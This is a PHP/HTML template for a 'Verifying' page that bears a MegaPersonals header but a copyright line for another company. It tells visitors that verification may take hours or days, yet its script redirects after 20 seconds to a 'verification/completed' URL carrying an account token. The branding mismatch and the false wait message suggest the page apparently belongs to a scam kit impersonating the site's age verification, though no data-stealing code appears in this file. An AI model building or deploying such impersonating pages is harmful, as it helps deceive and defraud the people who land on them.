<!doctype html>
<html>

<head>
   <title>Verification</title>
   <meta id="viewportMetaTag" name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta charset='utf-8'>
   <link rel="icon" type="image/png" sizes="16x16" href="<?= url("assets/" . "mega-verification/v2/images/favicon.png") ?>">
   <script type="text/javascript" src="<?= url("assets/" . "mega-verification/v2/js/p2/jquery.min.js") ?>"></script>
   <script type="text/javascript" src="<?= url("assets/" . "mega-verification/v2/js/p2/jquery-ui.min.js") ?>"></script>
   <link rel="stylesheet" href="<?= url("assets/" . "mega-verification/v2/css/p2/jquery-ui.min.css") ?>" />
   <script src="<?= url("assets/" . "mega-verification/v2/js/p2/bootstrap.bundle.js") ?>"></script>
   <link rel="stylesheet" href="<?= url("assets/" . "mega-verification/v2/css/p2/bootstrap-icons.css") ?>">
   <link rel="stylesheet" href="<?= url("assets/" . "mega-verification/v2/css/p2/bootstrap.min.css") ?>">
   <link rel="stylesheet" href="<?= url("assets/" . "mega-verification/v2/css/p2/custom.css") ?>">
</head>

<body>
   <style>
      .container-fluid .single-loader {
         font-size: 10px;
         margin: 50px auto;
      }
   </style>
   <main>
      <style>
         #top-header {
            position: fixed;
            top: 0;
            width: 100%;
            box-shadow: 0px 1px 6px 2px #0000007d;
            z-index: 1;
         }

         #top-header img {
            max-width: 90%;
            max-height: 40px;
         }

         #top-header .mp-header {
            background-color: #ff2aac;
            padding: 7px 10px;
            text-align: center;
         }

         .verification-container {
            margin-top: 30px;
         }
      </style>
      <div id="top-header">
         <div class="mp-header">
            <img src="<?= url("assets/" . "mega-verification/v2/images/p2/megapersonalsPageHeader.png") ?>" />
         </div>
      </div>
      <div class="container-fluid verification-container verification-container-page min-vh-100 px-4 py-5">
         <h1 class="text-success text-uppercase bold">Verifying</h1>
         <h2>Normally this step <br>can take minutes <br>but with volume it <br>may be hours if not <br>a few days for <br>verification to <br>complete.</h2>
         <h2>Your patience is <br>appreciated.</h2>
         <div class="single-loader"></div>
         <style>
            .single-loader {
               color: #92bd7f;
               font-size: 20px;
               margin: 100px auto;
               width: 1em;
               height: 1em;
               border-radius: 50%;
               position: relative;
               text-indent: -9999em;
               -webkit-animation: load4 1.3s infinite linear;
               animation: load4 1.3s infinite linear;
               -webkit-transform: translateZ(0);
               -ms-transform: translateZ(0);
               transform: translateZ(0);
            }

            @-webkit-keyframes load4 {

               0%,
               100% {
                  box-shadow: 0 -3em 0 0.2em, 2em -2em 0 0em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 0;
               }

               12.5% {
                  box-shadow: 0 -3em 0 0, 2em -2em 0 0.2em, 3em 0 0 0, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 -1em;
               }

               25% {
                  box-shadow: 0 -3em 0 -0.5em, 2em -2em 0 0, 3em 0 0 0.2em, 2em 2em 0 0, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 -1em;
               }

               37.5% {
                  box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0em 0 0, 2em 2em 0 0.2em, 0 3em 0 0em, -2em 2em 0 -1em, -3em 0em 0 -1em, -2em -2em 0 -1em;
               }

               50% {
                  box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 0em, 0 3em 0 0.2em, -2em 2em 0 0, -3em 0em 0 -1em, -2em -2em 0 -1em;
               }

               62.5% {
                  box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 0, -2em 2em 0 0.2em, -3em 0 0 0, -2em -2em 0 -1em;
               }

               75% {
                  box-shadow: 0em -3em 0 -1em, 2em -2em 0 -1em, 3em 0em 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 0, -3em 0em 0 0.2em, -2em -2em 0 0;
               }

               87.5% {
                  box-shadow: 0em -3em 0 0, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 0, -3em 0em 0 0, -2em -2em 0 0.2em;
               }
            }

            @keyframes load4 {

               0%,
               100% {
                  box-shadow: 0 -3em 0 0.2em, 2em -2em 0 0em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 0;
               }

               12.5% {
                  box-shadow: 0 -3em 0 0, 2em -2em 0 0.2em, 3em 0 0 0, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 -1em;
               }

               25% {
                  box-shadow: 0 -3em 0 -0.5em, 2em -2em 0 0, 3em 0 0 0.2em, 2em 2em 0 0, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 -1em;
               }

               37.5% {
                  box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0em 0 0, 2em 2em 0 0.2em, 0 3em 0 0em, -2em 2em 0 -1em, -3em 0em 0 -1em, -2em -2em 0 -1em;
               }

               50% {
                  box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 0em, 0 3em 0 0.2em, -2em 2em 0 0, -3em 0em 0 -1em, -2em -2em 0 -1em;
               }

               62.5% {
                  box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 0, -2em 2em 0 0.2em, -3em 0 0 0, -2em -2em 0 -1em;
               }

               75% {
                  box-shadow: 0em -3em 0 -1em, 2em -2em 0 -1em, 3em 0em 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 0, -3em 0em 0 0.2em, -2em -2em 0 0;
               }

               87.5% {
                  box-shadow: 0em -3em 0 0, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 0, -3em 0em 0 0, -2em -2em 0 0.2em;
               }
            }
         </style>
         <div class="d-flex flex-column">
            <img class="img-footer-logo mt-2" src='<?= url("assets/" . "mega-verification/v2/images/p2/footer-logo.png") ?>' />
            <style>
               @media screen and (max-width: 500px) {
                  p.copyright {
                     font-size: 3vw;
                  }
               }
            </style>
            <div>
               <p class="d-flex justify-content-center fw-bold mb-0 mt-2 copyright">Copyright &copy; 2022 Age Smart LDA. All Rights Reserved.</p>
               <p class="d-flex justify-content-center gap-3 fw-bold mb-0 copyright">
                  <a href="#">Terms of Use</a>
                  <a href="3">Privacy Policy</a>
                  <a href="3">Billing Questions</a>
               </p>
            </div>
         </div>
      </div>
   </main>
   <script>
      $(document).ready(function() {
         function redirect() {
            setTimeout(() => {
               window.location.href = "<?= url("verification/completed?token={$account_access_token}") ?>";
            }, 20000);
         }

         redirect();
      })
   </script>
</body>

</html>